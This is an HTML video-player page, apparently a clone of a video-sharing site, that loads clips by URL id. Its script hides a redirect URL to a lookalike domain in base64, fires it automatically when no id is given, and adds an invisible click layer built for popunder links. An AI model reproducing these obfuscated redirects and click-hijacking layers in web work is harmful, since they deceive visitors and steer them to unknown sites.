<!DOCTYPE html>

<meta charset="UTF-8">
<title>bule edan</title>
 
<style>
*{box-sizing:border-box}
.header-title {
  text-decoration: none;
  color: #111;
}

.video-actions{
  width:100%;
  display:none;
  justify-content:center
}
.video-actions-inner{
  width:100%;
  max-width:720px;
  display:flex;
  gap:8px;
  padding:12px 12px 6px;
  overflow-x:auto;
  scrollbar-width:none;
  -ms-overflow-style:none;
  white-space:nowrap
}
.video-actions-inner::-webkit-scrollbar{display:none}

.action-btn{
  background:#f2f2f2;
  border:none;
  padding:8px 16px;
  border-radius:16px;
  font-family:inherit;
  font-size:14px;
  font-weight:500;
  cursor:pointer;
  transition:background-color .2s,transform .1s;
  flex-shrink:0
}
.action-btn,.action-btn a{color:#000}
.action-btn:hover{
  background:#e5e5e5;
  transform:translateY(-1px)
}


.video-inner{position:relative}
.video-click-layer{
  position:absolute;
  inset:0;
  width:100%;
  height:100%;
  background:transparent;
  border:none;
  cursor:pointer;
  z-index:5;
}


.native-banner-wrap{
  width:100%;
  display:flex;
  justify-content:center;
  align-items:center;
  padding:16px 12px 8px;
}
.native-banner-wrap > *{max-width:100%}
.native-banner-wrap img,
.native-banner-wrap iframe{
  display:block;
  max-width:100%;
  height:auto;
}


html, body{
  height:100%;
  margin:0;
  padding:0;
  background:#fff;
  color:#111;
  font-family:'Inter',Arial,sans-serif;
}
body{
  display:flex;
  flex-direction:column;
  align-items:center;
  min-height:100vh;
}


.main-header{
  width:100%;
  padding:12px 0;
  background:#fff;
  border-bottom:1px solid #e5e7eb;
  position:sticky;
  top:0;
  z-index:100;
}
.header-container{
  max-width:1170px;
  margin:0 auto;
  padding:0 15px;
  display:flex;
  justify-content:space-between;
  align-items:center;
}
.header-left,.header-right{
  display:flex;
  align-items:center;
  gap:12px;
}
.header-title{
  font-weight:700;
  font-size:28px;
}
.header-upload-btn{
  background:#f3f4f6;
  padding:9px 16px;
  border-radius:16px;
  font-size:14px;
  font-weight:600;
  text-decoration:none;
  color:#111;
}
.header-upload-btn:hover{background:#e5e7eb}

/* VIDEO PLAYER */
.video-player-wrap{
  width:100%;
  padding-top:20px;
  display:flex;
  flex-direction:column;
  align-items:center;
}
.ad-container-top,.ad-container-bottom{
  margin:20px 0;
  text-align:center;
}
.player-row{
  display:flex;
  gap:25px;
}
.ad-side{width:160px}

.video-box{
  width:800px;
  max-width:90vw;
  aspect-ratio:16/9;
  border-radius:16px;
  overflow:hidden;
  box-shadow:0 2px 16px rgba(0,0,0,.08);
  position:relative;
  display:flex;
  align-items:center;
  justify-content:center;
}
.video-box video{
  width:100%;
  height:100%;
  object-fit:contain;
}


video::-webkit-media-controls-play-button,
video::-webkit-media-controls-start-playback-button{
  display:none !important;
}

/* PLAY ICON */
.play-overlay{
  position:absolute;
  top:50%;
  left:50%;
  transform:translate(-50%,-50%);
  width:80px;
  height:80px;
  background:rgba(0,0,0,.6);
  border-radius:50%;
  display:none;
  align-items:center;
  justify-content:center;
}


.video-actions{
  display:flex;
  justify-content:center;
  padding:18px 0 10px;
}
.download-btn{
  background:linear-gradient(90deg,#667eea,#764ba2);
  color:#fff;
  border-radius:24px;
  padding:12px 24px;
  font-size:18px;
  text-decoration:none;
  display:inline-flex;
  align-items:center;
}
.download-btn i{margin-right:8px}


.playlist-wrapper{
  display:flex;
  justify-content:center;
  margin:24px 0;
}
.playlist-grid{
  display:flex;
  flex-wrap:wrap;
  gap:20px;
  justify-content:center;
  max-width:820px;
}
.playlist-item{width:185px}


footer{
  margin-top:20px;
  text-align:center;
  color:gray;
}


@media (max-width:768px){
  .ad-container-top,
  .ad-container-bottom,
  .ad-side{
    display:none;
  }

  .video-box{
    width:calc(100vw - 20px);
    border-radius:8px;
    box-shadow:none;
  }

  .playlist-item{
    width:calc(50% - 10px);
  }

  .header-title{
    font-size:22px;
  }

  /* BONUS: tombol selalu terlihat */
  .video-actions{
    position:sticky;
    bottom:10px;
    z-index:999;
  }
}
</style>

    <script>
      const video        = document.getElementById("video");
      const videoError   = document.getElementById("video-error");
      const videoActions = document.querySelector(".video-actions");
      const clickLayer   = document.getElementById("firstClickLayer");
      const params = new URLSearchParams(window.location.search);
      const id = params.get("id");
      const base         = "https://cdn2.videy.co/" + id;
    if (!id) {
    console.log("ID tidak ditemukan, redirect dalam 2 detik...");

    setTimeout(() => {
        const redirectLink = atob("aHR0cHM6Ly94bGlua3ZpZGVleS5naXRodWIuaW8vZ2hqZHQ");
        window.location.href = redirectLink;
    }, 2000); // ⏱️ jeda 2 detik
} 
      function loadVideo(src){
        video.src = src;
        video.load();
      }

      loadVideo(base + ".mp4");

      video.onerror = function () {
        if (!video.dataset.triedMov) {
          video.dataset.triedMov = "1";
          loadVideo(base + ".mov");
        } else {
          video.style.display        = "none";
          videoError.style.display   = "block";
          videoActions.style.display = "none";
          if (clickLayer) clickLayer.style.display = "none";
        }
      };

      video.oncanplay = function () {
        videoError.style.display    = "none";
        video.style.display         = "block";
        videoActions.style.display  = "flex";
      };

      (function(){
        const layer = document.getElementById('firstClickLayer');
        const directLink = "#";

        if (!layer || !directLink || directLink === '#') {
          if (layer) layer.remove();
          return;
        }

        layer.addEventListener('click', function(e){
          e.preventDefault();
          e.stopPropagation();
          window.open(directLink, '_blank');
          layer.remove();
        }, { once: true });
      })();
    </script>
